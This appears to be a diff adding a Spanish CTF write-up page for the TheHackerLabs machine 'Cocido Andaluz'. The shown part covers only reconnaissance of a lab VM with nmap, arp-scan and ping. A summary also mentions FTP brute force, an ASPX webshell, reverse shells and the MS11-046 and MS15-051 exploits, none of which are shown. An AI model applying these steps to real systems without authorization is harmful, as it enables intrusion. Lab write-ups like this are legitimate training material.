@@ -1,0 +1,1336 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cocido Andaluz - TheHackerLabs · BerserkWings - Hacking Ético</title>
+<meta name="description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+
+<meta http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+               img-src 'self';
+               style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
+               font-src 'self' https://fonts.gstatic.com;
+               script-src 'self' ;
+               connect-src 'self' ;
+               object-src 'none';
+               base-uri 'self';
+               form-action 'self';
+               upgrade-insecure-requests;">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+
+<link rel="canonical" href="http://localhost:1313/THL-writeup-cocidoAndaluz/">
+<link rel="icon" href="/assets/images/favicon.png">
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Chakra+Petch:wght@500;600;700&family=Inter:wght@400;500&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/main.min.b51fce260bd224cda026ea0223adf133e0ce779edbb6c14d513c3f101c33a9ff.css" integrity="sha256-tR/OJgvSJM2gJuoCI63xM&#43;DOd57btsFNUTw/EBwzqf8=">
+
+
+<meta property="og:title" content="Cocido Andaluz - TheHackerLabs">
+<meta property="og:description" content="Writeups de ciberseguridad, CTFs, Active Directory y certificaciones.">
+<meta property="og:type" content="article">
+<meta property="og:image" content="http://localhost:1313/assets/images/THL-writeup-cocidoAndaluz/CocidoAndaluz.jpg">
+
+
+
+</head>
+<body>
+  <header class="site-header">
+  <div class="wrap">
+    <a class="brand" href="/">
+      
+      <img class="brand-logo" src="http://localhost:1313/assets/images/masthead.png" alt="BerserkWings">
+      
+    </a>
+    <nav class="main-nav">
+      
+        <a href="/" >Inicio</a>
+      
+        <a href="/posts/" >Writeups</a>
+      
+        <a href="/categories/" >Categorías</a>
+      
+        <a href="/tags/" >Etiquetas</a>
+      
+        <a href="/buscador/" >Buscador</a>
+      
+        <a href="/acerca-de-mi/" >Acerca de mí</a>
+      
+    </nav>
+  </div>
+</header>
+
+  <main>
+    
+<canvas class="hero-matrix-bg hero-matrix-bg--dim" id="heroMatrixBg" aria-hidden="true"></canvas>
+<article class="post" id="top">
+  
+
+
+
+
+<aside class="side-profile">
+  <img class="side-avatar" src="http://localhost:1313/assets/images/avatar.png" alt="BerserkWings">
+  <div class="side-name">BerserkWings</div>
+  <div class="side-tagline">Aspirante a Pentester · CTF Player</div>
+
+  
+  <div class="side-platforms">
+    <span class="side-platform-badge">HTB: BerserkWings</span>
+    <span class="side-platform-badge">THL: BerserkWings</span>
+  </div>
+  
+
+  <div class="side-contact">
+    <span class="side-meta">📍 México</span>
+    
+    <a class="side-meta-link" href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">🔗 GitHub</a>
+    
+  </div>
+
+  
+  <div class="side-posts">
+    <div class="side-post-cards">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-grillo/">
+          <span class="side-post-card-title">Grillo</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-shined/">
+          <span class="side-post-card-title">Shined</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <div class="side-post-card is-current">
+          <span class="side-post-card-title">Cocido Andaluz</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </div>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-mortadela/">
+          <span class="side-post-card-title">Mortadela</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+        
+        
+        
+        
+        
+        <a class="side-post-card" href="http://localhost:1313/THL-writeup-chimichurri/">
+          <span class="side-post-card-title">Chimichurri</span>
+          <span class="side-post-card-platform">TheHackerLabs</span>
+        </a>
+        
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+  </div>
+  
+
+  
+
+  
+
+
+</aside>
+
+
+  
+  
+  
+
+  <header class="post-header">
+    
+    <div class="post-meta">TheHackerLabs / Easy Machine</div>
+    
+    <h1>Cocido Andaluz - TheHackerLabs</h1>
+    <div class="post-meta">3 February 2025 · 19 min de lectura</div>
+  </header>
+
+  
+  <img class="post-cover" src="http://localhost:1313/assets/images/THL-writeup-cocidoAndaluz/CocidoAndaluz.jpg" alt="Cocido Andaluz - TheHackerLabs">
+  
+
+  
+  <p class="post-lead">Esta fue una máquina bastante sencilla con la que pude probar varias cosillas. Después de aplicar los escaneos y al no encontrar una forma de enumerar sus servicios, aplicamos fuerza bruta al servicio FTP, encontrando un usuario y contraseñas válidos que nos permiten acceso a FTP y SMB. Dentro, descubrimos que usan el servicio FTP como un servidor para su página web, por lo que aprovechamos esto para cargar una WebShell de ASPX que nos permite ejecutar comandos. Aprovechamos esto para usar varios métodos que nos permiten ganar acceso a la máquina. Ya dentro y enumerando la máquina, descubrimos que es vulnerable a dos Exploits que nos permiten escalar privilegios, estos son: MS11-046 y MS15-051.</p>
+  
+
+  
+  <details class="post-tools">
+    <summary>🛠 Herramientas utilizadas</summary>
+
+    
+      
+      <ul><li><code>ping</code></li><li><code>nmap</code></li><li><code>arp-scan</code></li><li><code>wappalizer</code></li><li><code>ftp</code></li><li><code>crackmapexec</code></li><li><code>smbclient</code></li><li><code>smbmap</code></li><li><code>hydra</code></li><li><code>locate</code></li><li><code>aspx_cmd.aspx</code></li><li><code>msfvenom</code></li><li><code>nc.exe</code></li><li><code>metasploit framework (msfconsole)</code></li><li><code>meterpreter</code></li><li><code>Módulo: `post/multi/recon/local_exploit_suggester`</code></li><li><code>Módulo: `exploit/windows/local/ms15_051_client_copy_image`</code></li><li><code>rlwrap</code></li><li><code>nc</code></li><li><code>impacket-smbserver</code></li><li><code>whoami</code></li><li><code>systeminfo</code></li><li><code>searchsploit</code></li><li><code>i686-w64-mingw32-gcc</code></li><li><code>python3</code></li><li><code>certutil.exe</code></li></ul>
+    
+  </details>
+  
+
+  
+  <details class="toc" id="indice" open>
+    <summary>📑 Índice</summary>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#FTP">Analizando Servicio FTP</a></li>
+        <li><a href="#SMB">Analizando Servicio SMB</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#FTPbrute">Aplicando Fuerza Bruta al Servicio FTP</a></li>
+        <li><a href="#EnumFTPyWebshell">Enumeración de Servicio FTP y Subiendo una WebShell de ASPX</a></li>
+        <li><a href="#DistMetodos">Conectándonos a la Máquina Víctima con Distintos Métodos</a>
+          <ul>
+            <li><a href="#RevShell">Creando y Ejecutando una Reverse Shell de ASPX con msfvenom</a></li>
+            <li><a href="#BinNC">Cargando y Utilizando Binario nc.exe para Obtener Conexión</a></li>
+            <li><a href="#RevShell2">Obteniendo Sesión de Meterpreter con Reverse Shell de ASPX</a></li>
+            <li><a href="#BinNC2">Ejecutando Binario nc.exe desde Recurso Compartido de SMB para Obtener Sesión</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#EnumWin">Enumeración de Máquina Windows</a></li>
+        <li><a href="#PostExp">Probando Exploit: Microsoft Windows (x86) - &lsquo;afd.sys&rsquo; Local Privilege Escalation (MS11-046)</a></li>
+        <li><a href="#PostExp2">Probando Exploit: Microsoft Windows - ClientCopyImage Win32k (MS15-051) (Metasploit)</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </details>
+  <aside class="side-toc">
+    <div class="side-toc-header">📑 Índice</div>
+    <nav>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#Recopilacion">Recopilación de Información</a>
+      <ul>
+        <li><a href="#Hosts">Descubrimiento de Hosts</a></li>
+        <li><a href="#Ping">Traza ICMP</a></li>
+        <li><a href="#Puertos">Escaneo de Puertos</a></li>
+        <li><a href="#Servicios">Escaneo de Servicios</a></li>
+      </ul>
+    </li>
+    <li><a href="#Analisis">Análisis de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#HTTP">Analizando Servicio HTTP</a></li>
+        <li><a href="#FTP">Analizando Servicio FTP</a></li>
+        <li><a href="#SMB">Analizando Servicio SMB</a></li>
+      </ul>
+    </li>
+    <li><a href="#Explotacion">Explotación de Vulnerabilidades</a>
+      <ul>
+        <li><a href="#FTPbrute">Aplicando Fuerza Bruta al Servicio FTP</a></li>
+        <li><a href="#EnumFTPyWebshell">Enumeración de Servicio FTP y Subiendo una WebShell de ASPX</a></li>
+        <li><a href="#DistMetodos">Conectándonos a la Máquina Víctima con Distintos Métodos</a>
+          <ul>
+            <li><a href="#RevShell">Creando y Ejecutando una Reverse Shell de ASPX con msfvenom</a></li>
+            <li><a href="#BinNC">Cargando y Utilizando Binario nc.exe para Obtener Conexión</a></li>
+            <li><a href="#RevShell2">Obteniendo Sesión de Meterpreter con Reverse Shell de ASPX</a></li>
+            <li><a href="#BinNC2">Ejecutando Binario nc.exe desde Recurso Compartido de SMB para Obtener Sesión</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#Post">Post Explotación</a>
+      <ul>
+        <li><a href="#EnumWin">Enumeración de Máquina Windows</a></li>
+        <li><a href="#PostExp">Probando Exploit: Microsoft Windows (x86) - &lsquo;afd.sys&rsquo; Local Privilege Escalation (MS11-046)</a></li>
+        <li><a href="#PostExp2">Probando Exploit: Microsoft Windows - ClientCopyImage Win32k (MS15-051) (Metasploit)</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+      <ul><li><a href="#links-de-investigacion">Links de investigación</a></li></ul>
+    </nav>
+  </aside>
+  
+
+  <div class="post-content">
+    <h2 id="Recopilacion">Recopilación de Información</h2>
+<h3 id="Hosts">Descubrimiento de Hosts</h3>
+<p>Hagamos un descubrimiento de hosts para encontrar a nuestro objetivo.</p>
+<p>Lo haremos primero con <strong>nmap</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sn 192.168.1.0/24
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.80
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.00020s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> Tu_IP
+</span></span><span style="display:flex;"><span>Host is up.
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">256</span> IP addresses <span style="color:#f92672">(</span><span style="color:#ae81ff">14</span> hosts up<span style="color:#f92672">)</span> scanned in 2.43 seconds
+</span></span></code></pre></div><p>Vamos a probar la herramienta <strong>arp-scan</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>arp-scan -I eth0 -g 192.168.1.0/24
+</span></span><span style="display:flex;"><span>Interface: eth0, type: EN10MB, MAC: XX, IPv4: Tu_IP
+</span></span><span style="display:flex;"><span>Starting arp-scan 1.10.0 with <span style="color:#ae81ff">256</span> hosts <span style="color:#f92672">(</span>https://github.com/royhills/arp-scan<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>192.168.100.213	XX	PCS Systemtechnik GmbH
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">14</span> packets received by filter, <span style="color:#ae81ff">0</span> packets dropped by kernel
+</span></span><span style="display:flex;"><span>Ending arp-scan 1.10.0: <span style="color:#ae81ff">256</span> hosts scanned in 2.179 seconds <span style="color:#f92672">(</span>117.49 hosts/sec<span style="color:#f92672">)</span>. <span style="color:#ae81ff">14</span> responded
+</span></span></code></pre></div><p>Encontramos nuestro objetivo y es:<code>192.168.1.80</code></p>
+<h3 id="Ping">Traza ICMP</h3>
+<p>Vamos a realizar un ping para saber si la máquina está activa y en base al TTL veremos que SO opera en la máquina.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ping -c <span style="color:#ae81ff">4</span> 192.168.1.80
+</span></span><span style="display:flex;"><span>PING 192.168.1.80 <span style="color:#f92672">(</span>192.168.1.80<span style="color:#f92672">)</span> 56<span style="color:#f92672">(</span>84<span style="color:#f92672">)</span> bytes of data.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.80: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>2.91 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.80: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.947 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.80: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.952 ms
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">64</span> bytes from 192.168.1.80: icmp_seq<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span> ttl<span style="color:#f92672">=</span><span style="color:#ae81ff">128</span> time<span style="color:#f92672">=</span>0.945 ms
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>--- 192.168.1.80 ping statistics ---
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">4</span> packets transmitted, <span style="color:#ae81ff">4</span> received, 0% packet loss, time 3088ms
+</span></span><span style="display:flex;"><span>rtt min/avg/max/mdev <span style="color:#f92672">=</span> 0.945/1.438/2.908/0.848 ms
+</span></span></code></pre></div><p>Por el TTL sabemos que la máquina usa <strong>Windows</strong>, hagamos los escaneos de puertos y servicios.</p>
+<h3 id="Puertos">Escaneo de Puertos</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -p- --open -sS --min-rate <span style="color:#ae81ff">5000</span> -vvv -n -Pn 192.168.1.80 -oG allPorts
+</span></span><span style="display:flex;"><span>Host discovery disabled <span style="color:#f92672">(</span>-Pn<span style="color:#f92672">)</span>. All addresses will be marked <span style="color:#e6db74">&#39;up&#39;</span> and scan times may be slower.
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-03 12:44 CST
+</span></span><span style="display:flex;"><span>Initiating ARP Ping Scan at 12:44
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.80 <span style="color:#f92672">[</span><span style="color:#ae81ff">1</span> port<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Completed ARP Ping Scan at 12:44, 0.07s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> total hosts<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Initiating SYN Stealth Scan at 12:44
+</span></span><span style="display:flex;"><span>Scanning 192.168.1.80 <span style="color:#f92672">[</span><span style="color:#ae81ff">65535</span> ports<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>Discovered open port 80/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 139/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 445/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 135/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 21/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 49158/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 49154/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 49155/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 49156/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 49157/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 49153/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Discovered open port 49152/tcp on 192.168.1.80
+</span></span><span style="display:flex;"><span>Completed SYN Stealth Scan at 12:45, 50.41s elapsed <span style="color:#f92672">(</span><span style="color:#ae81ff">65535</span> total ports<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.80
+</span></span><span style="display:flex;"><span>Host is up, received arp-response <span style="color:#f92672">(</span>0.0038s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>Scanned at 2025-02-03 12:44:39 CST <span style="color:#66d9ef">for</span> 50s
+</span></span><span style="display:flex;"><span>Not shown: <span style="color:#ae81ff">38898</span> filtered tcp ports <span style="color:#f92672">(</span>no-response<span style="color:#f92672">)</span>, <span style="color:#ae81ff">26625</span> closed tcp ports <span style="color:#f92672">(</span>reset<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE      REASON
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp          syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>80/tcp    open  http         syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc        syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn  syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49152/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49153/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49154/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49155/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49156/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49157/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>49158/tcp open  unknown      syn-ack ttl <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Read data files from: /usr/share/nmap
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 50.68 seconds
+</span></span><span style="display:flex;"><span>           Raw packets sent: <span style="color:#ae81ff">220613</span> <span style="color:#f92672">(</span>9.707MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">26642</span> <span style="color:#f92672">(</span>1.066MB<span style="color:#f92672">)</span>
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-p-</em></td>
+					<td>Para indicarle un escaneo en ciertos puertos.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;open</em></td>
+					<td>Para indicar que aplique el escaneo en los puertos abiertos.</td>
+			</tr>
+			<tr>
+					<td><em>-sS</em></td>
+					<td>Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>&ndash;min-rate</em></td>
+					<td>Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).</td>
+			</tr>
+			<tr>
+					<td><em>-vvv</em></td>
+					<td>Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-n</em></td>
+					<td>Para indicar que no se aplique resolución dns para agilizar el escaneo.</td>
+			</tr>
+			<tr>
+					<td><em>-Pn</em></td>
+					<td>Para indicar que se omita el descubrimiento de hosts.</td>
+			</tr>
+			<tr>
+					<td><em>-oG</em></td>
+					<td>Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Bien, parece que está activa una página web en el <strong>puerto 80</strong> y veo activo el <strong>servicio FTP</strong> en el <strong>puerto 21</strong>, quizá estén relacionados, pero eso lo veremos más adelante.</p>
+<h3 id="Servicios">Escaneo de Servicios</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nmap -sCV -p 21,80,135,139,445,49152,49153,49154,49155,49156,49157,49158 192.168.1.80 -oN targeted
+</span></span><span style="display:flex;"><span>Starting Nmap 7.95 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2025-02-03 12:47 CST
+</span></span><span style="display:flex;"><span>Nmap scan report <span style="color:#66d9ef">for</span> 192.168.1.80
+</span></span><span style="display:flex;"><span>Host is up <span style="color:#f92672">(</span>0.0013s latency<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>PORT      STATE SERVICE       VERSION
+</span></span><span style="display:flex;"><span>21/tcp    open  ftp           Microsoft ftpd
+</span></span><span style="display:flex;"><span>80/tcp    open  http          Microsoft IIS httpd 7.0
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_http-title: Apache2 Debian Default Page: It works
+</span></span><span style="display:flex;"><span>|_http-server-header: Microsoft-IIS/7.0
+</span></span><span style="display:flex;"><span>| http-methods: 
+</span></span><span style="display:flex;"><span>|_  Potentially risky methods: TRACE
+</span></span><span style="display:flex;"><span>135/tcp   open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span style="display:flex;"><span>445/tcp   open  microsoft-ds?
+</span></span><span style="display:flex;"><span>49152/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49153/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49154/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49155/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49156/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49157/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>49158/tcp open  msrpc         Microsoft Windows RPC
+</span></span><span style="display:flex;"><span>MAC Address: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Host script results:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>|_nbstat: NetBIOS name: WIN-JG67MIHZH2X, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: XX <span style="color:#f92672">(</span>PCS Systemtechnik/Oracle VirtualBox virtual NIC<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>| smb2-time: 
+</span></span><span style="display:flex;"><span>|   date: 2025-02-03T18:48:09
+</span></span><span style="display:flex;"><span>|_  start_date: 2025-02-03T10:36:35
+</span></span><span style="display:flex;"><span>| smb2-security-mode: 
+</span></span><span style="display:flex;"><span>|   2:0:2: 
+</span></span><span style="display:flex;"><span>|_    Message signing enabled but not required
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span style="display:flex;"><span>Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 65.65 seconds
+</span></span></code></pre></div><table>
+	<thead>
+			<tr>
+					<th>Parámetros</th>
+					<th>Descripción</th>
+			</tr>
+	</thead>
+	<tbody>
+			<tr>
+					<td><em>-sC</em></td>
+					<td>Para indicar un lanzamiento de scripts básicos de reconocimiento.</td>
+			</tr>
+			<tr>
+					<td><em>-sV</em></td>
+					<td>Para identificar los servicios/versión que están activos en los puertos que se analicen.</td>
+			</tr>
+			<tr>
+					<td><em>-p</em></td>
+					<td>Para indicar puertos específicos.</td>
+			</tr>
+			<tr>
+					<td><em>-oN</em></td>
+					<td>Para indicar que el output se guarde en un fichero. Lo llame targeted.</td>
+			</tr>
+	</tbody>
+</table>
+<p>Se me hace bastante curioso que tiene desplegado <strong>Apache</strong>, cuando normalmente es <strong>IIS o HFS</strong> o algo relacionado con <strong>Windows</strong>. Además, parece que el <strong>servicio SMB</strong> no nos pide credenciales para conectarnos.</p>
+<h2 id="Analisis">Análisis de Vulnerabilidades</h2>
+<h3 id="HTTP">Analizando Servicio HTTP</h3>
+<p>Entremos:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura1.png">
+</p>
+<p>Tenemos la página por defecto de <strong>Apache</strong>.</p>
+<p>Veamos que nos dice <strong>Wappalizer</strong>:</p>
+<p align="center">
+<img src="/assets/images/THL-writeup-cocidoAndaluz/Captura2.png">
+</p>
+<p>No veo nada que nos sirva.</p>
+<p>Te diría que aplicáramos <strong>Fuzzing</strong>, pero en mi caso no encontré nada, por lo que vamos a saltarnos esa parte.</p>
+<p>Vamos a ver si podemos entrar al <strong>servicio FTP</strong>.</p>
+<h3 id="FTP">Analizando Servicio FTP</h3>
